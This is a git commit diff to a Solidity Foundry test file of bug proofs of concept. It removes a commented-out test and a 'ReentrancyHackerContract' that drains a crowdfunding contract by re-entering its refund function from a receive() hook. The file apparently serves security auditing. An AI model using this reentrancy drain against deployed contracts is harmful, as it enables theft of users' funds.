72bded8965aaa0cc9d0ba6f65e013174f5b658e5
Anish Agrawal <anish@olympix.ai>
2023-07-07 13:20:54 -0400

    Remove previous tests

--- test/opix_bug_pocs.sol
+++ test/opix_bug_pocs.sol
@@ -47,72 +47,11 @@ contract OpixBugPocs is Test {
         assertTrue(address(project).balance > 100 ether, "Over contribution failed");
     } 
 
-    // function test_RefundReentrancy() public {
-    //     // There is a reentrancy bug in the refund function, since contribution of the sender is set to 0 after the call to the sender, which can reenter into refund. 
-    //     vm.deal(address(project), 10 ether); // the amount of ether we will drain from the project
-
-
-    //     vm.startPrank(hacker);
-    //     uint contrib_amt = 0.02 ether;
-
-
-    //     ReentrancyHackerContract hackerContract = new 
-    //     ReentrancyHackerContract(address(project), contrib_amt);
-
-    //     // The hacker first contributed some money when the goal was not failed.
-    //     hackerContract.contribute{value: contrib_amt}(); 
-
-
-
-    //     vm.warp(block.timestamp +  31 days); // The goal is now failed, so we can call refund. (The hack takes place after this time, so this is not cheating.)
-
-    //     hackerContract.hack();
- 
-
-    //     hackerContract.withdraw();
-    //     vm.stopPrank();
-
-    //     console.log("hackerContract.balance = ", address(hackerContract).balance);
-    //     console.log("hacker.balance = ", address(hacker).balance);
-
-    //     require(address(hacker).balance >= 10 ether, "Reentrancy failed");
-
-
-    // }
 
 
 }
 
 
-
-// contract ReentrancyHackerContract {
-//     Project _victim;
-//     uint _contrib_amt;
-//     constructor(address victim, uint contrib_amt) {
-//         _victim = Project(victim);
-//         _contrib_amt = contrib_amt;
-//     }
-    
-//     function contribute() payable external {
-//         _victim.contribute{value: _contrib_amt}();
-//     }
-
-
-
-//     function hack() payable external {
-
-//         _victim.refund();
-//     }
-
-//     receive() payable external {
-//         if(address(_victim).balance > _contrib_amt)
-//             _victim.refund();
-//     }
-
-//     function withdraw() external {
-//         payable(msg.sender).transfer(address(this).balance);
-//     }
-// }
 
 contract OverContributionContract{
 
